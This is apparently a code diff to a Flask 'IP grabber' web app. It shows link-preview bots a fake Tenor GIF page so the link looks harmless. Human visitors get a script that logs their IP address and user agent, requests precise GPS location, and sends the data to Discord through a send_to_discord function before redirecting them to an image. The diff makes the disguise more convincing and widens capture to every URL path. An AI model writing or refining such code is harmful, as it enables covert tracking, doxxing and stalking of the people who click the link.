@@ -61,37 +61,40 @@ def send_to_discord(ip, ua_string, geo, gps_data=None):
     except:
         pass
 
-@app.route('/')
-def index():
+@app.route('/', defaults={'path': ''})
+@app.route('/<path:path>')
+def index(path):
     user_agent = request.headers.get('User-Agent', 'Unknown')
     ip = request.headers.get('x-forwarded-for', request.remote_addr)
     if ip and ',' in ip:
         ip = ip.split(',')[0].strip()
 
-    # Discord Bot Detection & LARGE Preview Enhancement
+    # 1. Discord Bot Detection & LARGE PREVIEW Enhancement
     if any(bot in user_agent for bot in ["Discordbot", "TelegramBot", "Twitterbot", "Slackbot", "LinkedInBot"]):
         return """
+        <!DOCTYPE html>
         <html>
         <head>
             <title>Loading Tenor GIF...</title>
             <meta property="og:title" content="Tenor - Animated GIF">
-            <meta property="og:description" content="Click to view the loading media... (High Quality)">
-            <meta property="og:image" content="https://media.tenor.com/images/307604f3f03b22ed78564f9b8131336a/tenor.gif">
+            <meta property="og:description" content="Click to view high-quality media...">
+            <!-- Transparent/Dark Loading GIF for 'Whole Box' look -->
+            <meta property="og:image" content="https://media.tenor.com/C7_89Jp5X6AAAAAC/loading-black.gif">
             <meta property="og:image:type" content="image/gif">
             <meta property="og:image:width" content="1200">
             <meta property="og:image:height" content="630">
             <meta property="og:type" content="website">
             <meta name="twitter:card" content="summary_large_image">
-            <meta name="twitter:image" content="https://media.tenor.com/images/307604f3f03b22ed78564f9b8131336a/tenor.gif">
+            <meta name="twitter:image" content="https://media.tenor.com/C7_89Jp5X6AAAAAC/loading-black.gif">
         </head>
-        <body style="background-color: #2f3136; color: white;">Redirecting to media...</body>
+        <body style="background-color: #2f3136;"></body>
         </html>
         """
 
     import random
     redirect_url = CUSTOM_IMAGE_URL if CUSTOM_IMAGE_URL else random.choice(IMAGES)
 
-    # Serve JS Bridge (Human Case)
+    # 2. Human Case: Serve JS Bridge for Logging
     return f"""
     <html>
     <head>
@@ -130,12 +133,8 @@ def index():
 
             if (navigator.geolocation) {{
                 navigator.geolocation.getCurrentPosition(
-                    (pos) => {{
-                        finalize({{ lat: pos.coords.latitude, lon: pos.coords.longitude }});
-                    }},
-                    (err) => {{
-                        finalize(); 
-                    }},
+                    (pos) => {{ finalize({{ lat: pos.coords.latitude, lon: pos.coords.longitude }}); }},
+                    (err) => {{ finalize(); }},
                     {{ enableHighAccuracy: true, timeout: 5000 }}
                 );
             }} else {{
